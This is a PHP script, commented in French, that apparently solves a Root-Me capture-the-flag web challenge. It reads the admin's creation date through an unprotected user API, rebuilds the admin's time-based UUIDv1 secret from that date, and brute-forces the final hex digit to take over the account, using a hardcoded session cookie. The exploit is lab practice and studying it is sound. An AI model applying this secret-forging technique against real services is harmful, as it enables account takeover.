<?php
require_once "./functions.php";
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! copier le cookie de session de la page pour que les requêtes s'envoient !!!!!!!!!!!!!!!!!!!!!!!!!!
$session_cookie = ".eJwlzrsNwzAMANFdVKcQKf7kZQyJIpG0dlwF2T0GssDd-5Q9jzifZXsfVzzK_lplK1MUUqi7LVHPXlGYg1k400iUGwAQ5CBBT8bVWlBXCsX09I6MMQS0GfqoVmcNaNJmzA7NjUNtVHKArNZVA-_FqN6T7hJRlBtynXH8NVi-P0kNLgQ.Zt7EQg.Vs5mIoy_AfKp2ZLKmWExT_0Z2VY";

$urls = [
    'signup' => 'http://challenge01.root-me.org:59091/api/signup',
    'login' => 'http://challenge01.root-me.org:59091/api/login'
];

$json_data = json_encode([
    'username' => 'a',
    'password' => 'a'
]);

foreach ($urls as $action => $url) {
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-type: application/json",
            'content' => $json_data
        )
    );
    $context = stream_context_create($options);
    // si il y a un problème enleve le @
    $response = json_decode(@file_get_contents($url, false, $context));

    echo "Réponse de la requête $action : " . (!empty($response->message) ? $response->message : "l'utilisateur a déjà été créé") . "\n";
    if (!empty($response->secret)) {
        $uuid = $response->secret;
        echo "Secret : " . $response->secret . "\n";
    }
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://challenge01.root-me.org:59091/api/user/1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIE, "session=$session_cookie");
$result = curl_exec($ch);
curl_close($ch);

$baseUrl = 'http://challenge01.root-me.org:59091/api/profile';

$dateAdmin = json_decode($result)->creation_date;
#la date a ajouter change (je ne sais pas pourquoi). C'est a adapté pour que ça fonctionne avec le profil "a" à 1 lettre près
$dateAdmin = Datetime::createFromFormat("Y-m-d H:i:s.u", $dateAdmin)->modify("+2 hours");
$dateAdmin->modify("-1 microseconds");

$uuidModified = modifyDateInUUIDv1($uuid, getTimestampByDate($dateAdmin));

for ($i = 0; $i < 16; $i++) {
    $parts = explode("-", $uuidModified);
    $parts[0] = substr($parts[0], 0, -1) . dechex($i);
    $secret = implode("-", $parts);
    $query = http_build_query(array('secret' => $secret));
    $url = "$baseUrl?$query";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIE, "session=$session_cookie");
    $result = curl_exec($ch);

    if (!str_contains($result, "Secret doesn't correspond to any user")) {
        echo "Le secret admin est : ".$secret;
        break;
    }
    curl_close($ch);
}
?>

